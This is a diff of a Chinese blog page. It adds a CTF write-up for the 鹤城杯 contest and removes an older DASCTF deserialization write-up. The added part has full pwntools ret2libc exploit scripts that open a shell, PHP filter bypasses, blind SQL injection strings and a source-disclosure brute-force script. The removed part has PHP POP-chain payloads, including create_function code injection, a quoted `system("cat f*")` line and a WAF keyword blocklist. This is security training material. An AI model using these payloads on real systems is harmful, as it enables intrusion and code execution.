@@ -164,6 +164,141 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-鹤城杯" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/10/09/%E9%B9%A4%E5%9F%8E%E6%9D%AF/">鹤城杯</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2021/10/09/%E9%B9%A4%E5%9F%8E%E6%9D%AF/" class="archive-article-date">
+  	<time datetime="2021-10-09T03:21:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-10-09</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>第一次以团队形式参赛，全大二队伍拿到96名成绩还可以<br>贡献不大，全靠队友带飞</p>
+<p>babyof payload<br>基本的ropgadget<br>from pwn import *<br>from LibcSearcher import *</p>
+<p>#io = process(‘./babyof’)<br>io = remote(‘182.116.62.85’, 21613)<br>elf = ELF(‘./babyof’)<br>context.log_level = ‘debug’</p>
+<p>pop_rdi_ret = 0x400743<br>puts_plt = elf.plt[‘puts’]<br>puts_got = elf.got[‘puts’]<br>func_addr = 0x400632</p>
+<p>payload = b’a’*(0x40 + 8) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(func_addr)<br>io.recv()<br>io.sendline(payload)</p>
+<p>io.recvline()<br>x = io.recv()[0:6]<br>puts_addr = u64(x.ljust(8,b’\x00’))<br>print(hex(puts_addr))</p>
+<p>libc = LibcSearcher(‘puts’,puts_addr)<br>libc_base = puts_addr - libc.dump(‘puts’)<br>system_addr = libc_base + libc.dump(‘system’)<br>binsh_addr = libc_base + libc.dump(‘str_bin_sh’)</p>
+<p>ret = 0x400506<br>payload2 = b’a’*(0x40+8)<br>payload2 += p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)</p>
+<p>io.sendline(payload2)<br>io.interactive()</p>
+<p>flag{89b55977-566c-431d-9034-74e7c181f340}</p>
+<p>littleof payload<br>多一个canary读取，和上题基本一样<br>from pwn import *<br>from LibcSearcher import *</p>
+<p>io = remote(‘182.116.62.85’, 27056)<br>#io = process(‘./littleof’)<br>elf = ELF(‘./littleof’)<br>context.log_level = ‘debug’</p>
+<p>pop_rdi_ret = 0x400863<br>puts_plt = elf.plt[‘puts’]<br>puts_got = elf.got[‘puts’]<br>func_addr = 0x4006e2</p>
+<p>payload1 = b’a’ * (0x50 - 8)<br>io.recv()<br>io.sendline(payload1)<br>io.recvuntil(payload1)<br>canary = u64(io.recv(8)) - 0xa<br>print(hex(canary))</p>
+<p>payload2 = payload1 + p64(canary) + p64(1) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(func_addr)<br>io.recv()<br>io.sendline(payload2)</p>
+<p>io.recvline()<br>x = io.recv()[0:6]<br>puts_addr = u64(x.ljust(8,b’\x00’))<br>print(hex(puts_addr))</p>
+<p>libc = LibcSearcher(‘puts’,puts_addr)<br>libc_base = puts_addr - libc.dump(‘puts’)<br>system_addr = libc_base + libc.dump(‘system’)<br>binsh_addr = libc_base + libc.dump(‘str_bin_sh’)</p>
+<p>io.sendline(b’1’)<br>io.recv()</p>
+<p>ret = 0x40059e<br>payload3 = payload1 + p64(canary) + p64(1) + p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)</p>
+<p>io.sendline(payload3)<br>io.interactive()</p>
+<p>flag{25e96197d4da10748a055753b5104856}</p>
+<p>easy_crytpo<br>签到题，联想到社会主义核心价值观编码，网上找到在线解码器<br>flag{IlUqU9O5guX6YiITsRNPiQmbhNRjGuTP}</p>
+<p>A_crytpo<br>根据flag长度分析得出可能是四位一组的分组编码，并且前二十位可能是<br>4O59：f<br>5954：l<br>494Q：a<br>3251：g<br>5046：{<br>md，我太菜了！</p>
+<p>WEB MIDDLE_MAGIC<br>level1绕过<br>$aaa = preg_replace(‘/^(.<em>)level(.</em>)$/‘, ‘${1}<!-- filtered -->${2}’, $_GET[‘aaa’]);<br>任意匹配不包括%0a,#需要url编码%23表示<br>aaa=%0apass_the_level_1%23<br>level2<br>sha1绕过，sha1不能对数组加密，返回值都是NULL<br>admin[]=1&amp;root_pwd=2<br>level3<br>json绕过<br>在json中0对应任意字符串<br>level_3 = {“result”:0}<br>flag{f03d41bf6c8d55f12324fd57f7a00427}</p>
+<p>NEW_MISC<br>下载下来是一个pdf文件<br>010打开，发现20/09 16进制对<br>怀疑pdf隐写，wbStego跑一下<br>flag{verY_g00d_YoU_f0und_th1s}</p>
+<p>MISC2<br>下载了一副图片<br>经检查，无隐写，无crc修改<br>放入stegsolve，点点点<br>发现有lsb，将字符串提取出来，发现是NCR转义，将其化为ascii，得<br>flag{h0w_4bouT_enc0de_4nd_pnG}</p>
+<p>easysql2</p>
+<p>xdm可以试试盲注<br>username error 和 passwd error</p>
+<p>数据库名ctf<br>用’and%0a(ascii(substr(version(),1,1))&gt;1)#爆一下版本号<br>版本号为8.0.4<br>使用最新的sql特性注入<br>admin’and/<strong>/(‘def’,’a’,3,4,5,6)&lt;=(table/</strong>/information_schema.TABLE_CONSTRAINTS/<strong>/limit/</strong>/317,1)#</p>
+<p>EASYP<br>题目：<br>&lt;?php<br>include ‘utils.php’;</p>
+<p>if (isset($_POST[‘guess’])) {<br>    $guess = (string) $_POST[‘guess’];<br>    if ($guess === $secret) {<br>        $message = ‘Congratulations! The flag is: ‘ . $flag;<br>    } else {<br>        $message = ‘Wrong. Try Again’;<br>    }<br>}</p>
+<p>if (preg_match(‘/utils.php/*$/i’, $_SERVER[‘PHP_SELF’])) {<br>    exit(“hacker :)”);<br>}</p>
+<p>if (preg_match(‘/show_source/‘, $_SERVER[‘REQUEST_URI’])){<br>    exit(“hacker :)”);<br>}</p>
+<p>if (isset($_GET[‘show_source’])) {<br>    highlight_file(basename($_SERVER[‘PHP_SELF’]));<br>    exit();<br>}else{<br>    show_source(<strong>FILE</strong>);<br>}<br>?&gt;</p>
+<p>脚本：<br>import requests</p>
+<p>for i in range(0,255):</p>
+<pre><code>j=hex(i)[2:]
+print(j)
+url = &#39;http://182.116.62.85:21895/index.php/utils.php/%&#39;+ j + &#39;?show%20source=1&#39;
+#http://182.116.62.85:21895/?show%20source=1
+r = requests.get(url)
+if &#39;flag&#123;&#39; in r.text:
+    print(r.text)
+    break
+</code></pre>
+<p>$_SERVER[‘REQUEST_URI’]会把特殊字符（如空格）转换成下划线<br>$secret需要爆破，所以有了j<br>basename() 函数返回路径中的文件名部分，$_SERVER[‘PHP_SELF’]返回当前执行脚本的文件名。<br>传入<a target="_blank" rel="noopener" href="http://182.116.62.85:21895/index.php/utils.php">http://182.116.62.85:21895/index.php/utils.php</a> 时，$_SERVER[‘PHP_SELF’]会返回index.php/utils.php，而basename()会返回utils.php。这样我们再加上?show%20source=1就可以让highlight_file显示utils.php，而flag就在里面。<br>flag{bsyxmK7ncU5nPjsGMckFo8kgq95qRasg}</p>
+<p>流量分析<br>手工分析<br>首先进行数据包筛选<br>发现是一道sql注入的数据包</p>
+<p>根据数据包回包中字符长度不一样的部分，取出其中的ascii码，转换成flag<br>1 102  f<br>2 108 l<br>3 97<br>4 103<br>5 123<br>6 119<br>7 49<br>8 114<br>9 101<br>10 115<br>11 104<br>12 65<br>13 82<br>14 75<br>15 95<br>16 101<br>17 122<br>18 95<br>19 49<br>20 115<br>21 110<br>22 116<br>23 105<br>24 116<br>25 125<br>26 33<br>flag{w1reshARK_ez_1sntit}</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/10/09/%E9%B9%A4%E5%9F%8E%E6%9D%AF/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
     <article id="post-ctfmanage" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1313,113 +1448,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2021/09/25/uploadlabs-1/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-hellouser" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/09/25/hellouser/">DASCTF秋季挑战赛_hellouser</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/09/25/hellouser/" class="archive-article-date">
-  	<time datetime="2021-09-25T08:38:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-09-25</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>本来这段时间太忙没有报ctf比赛的，今天在返校的火车上突然收到安恒的邀请短信，就登录打着玩玩了。</p>
-<p>打开后是php代码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A &#123;</span><br><span class="line">    public $var;</span><br><span class="line">    public function show()&#123;</span><br><span class="line">        echo $this-&gt;var;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B&#123;</span><br><span class="line">    public $func;</span><br><span class="line">    public $arg;</span><br><span class="line">    </span><br><span class="line">    public function show()&#123;</span><br><span class="line">        $func &#x3D; $this-&gt;func;</span><br><span class="line">        if(preg_match(&#39;&#x2F;^[a-z0-9]*$&#x2F;isD&#39;, $this-&gt;func) || preg_match(&#39;&#x2F;fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\&#96;|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#39;|\&#x3D;|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log&#x2F;i&#39;, $this-&gt;arg)) &#123; </span><br><span class="line">            die(&#39;No!No!No!&#39;); </span><br><span class="line">        &#125; else &#123; </span><br><span class="line">            include &quot;flag.php&quot;;</span><br><span class="line">            &#x2F;&#x2F;There is no code to print flag in flag.php</span><br><span class="line">            $func(&#39;&#39;, $this-&gt;arg); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $this-&gt;show();</span><br><span class="line">        return &quot;&lt;br&gt;&quot;.&quot;Nice Job!!&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;pop&#39;]))&#123;</span><br><span class="line">    $aaa &#x3D; unserialize($_GET[&#39;pop&#39;]);</span><br><span class="line">    $aaa();</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>很明显，需要序列化A然后在A中实体化B，进一步序列化B，达到“序列套序列”的效果。<br>可是直接写<code>val=new B();</code>是不行的。<br>没思路之下想到这是套神出的题，所以就在ctfshow的wp里找了一下，果然发现了方法：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class ctfShowUser&#123;</span><br><span class="line">    public $class;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;class&#x3D;new backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class backDoor&#123;</span><br><span class="line">    public $code&#x3D;&#39;system(&quot;cat f*&quot;);&#39;;</span><br><span class="line">&#125;</span><br><span class="line">$b&#x3D;new ctfShowUser();</span><br><span class="line">echo urlencode(serialize($b));</span><br></pre></td></tr></table></figure>
-
-<p>可以通过<code>__construct()</code>魔法函数实体化别的类。<br>所以第一步的payload为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A &#123;</span><br><span class="line">	public function __construct()&#123;</span><br><span class="line">    $this-&gt;var &#x3D;new B();</span><br><span class="line">&#125;</span><br><span class="line">	public $var&#x3D;&quot;123&quot;;</span><br><span class="line">&#125;</span><br><span class="line">class B&#123;</span><br><span class="line">    public $func;</span><br><span class="line">    public $arg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$bbb &#x3D; new A; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo $bbb&#x3D;serialize($bbb);</span><br></pre></td></tr></table></figure>
-
-<p>之后就是给$func和$arg赋值，构造可执行函数了<br>这里可以直接参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/xiaolong22333/article/details/115332682">https://blog.csdn.net/xiaolong22333/article/details/115332682</a><br>绕waf可以用get_defined_vars()函数，所以第二个payload为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A &#123;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">    $this-&gt;var &#x3D;new B();</span><br><span class="line">&#125;</span><br><span class="line">    public $var&#x3D;&quot;123&quot;;</span><br><span class="line">&#125;</span><br><span class="line">class B&#123;</span><br><span class="line">    public $func&#x3D;&quot;create_function&quot;;</span><br><span class="line">    public $arg&#x3D;&quot;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$bbb &#x3D; new A; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo $bbb&#x3D;serialize($bbb);</span><br></pre></td></tr></table></figure>
-<p>获得真正的flag文件名（不愧是套神）</p>
-<img src="/2021/09/25/hellouser/1.PNG" class="" title="1.PNG">
-
-<p>然后可以用require代替被waf的include，用base64绕过flag的waf（<code>VHJ1M2ZsYWcucGhw</code>）<br>所以最后的payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A &#123;</span><br><span class="line">	public function __construct()&#123;</span><br><span class="line">    $this-&gt;var &#x3D;new B();</span><br><span class="line">&#125;</span><br><span class="line">	public $var&#x3D;&quot;123&quot;;</span><br><span class="line">&#125;</span><br><span class="line">class B&#123;</span><br><span class="line">    public $func&#x3D;&quot;create_function&quot;;</span><br><span class="line">    public $arg&#x3D;&quot;&#125;require(base64_decode(VHJ1M2ZsYWcucGhw));var_dump(get_defined_vars());&#x2F;&#x2F;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$bbb &#x3D; new A; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo $bbb&#x3D;serialize($bbb);</span><br></pre></td></tr></table></figure>
-<p>得到真正的flag</p>
-<img src="/2021/09/25/hellouser/1.PNG" class="" title="1.PNG">
-
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/09/25/hellouser/">展开全文 >></a>
         </p>
       
 
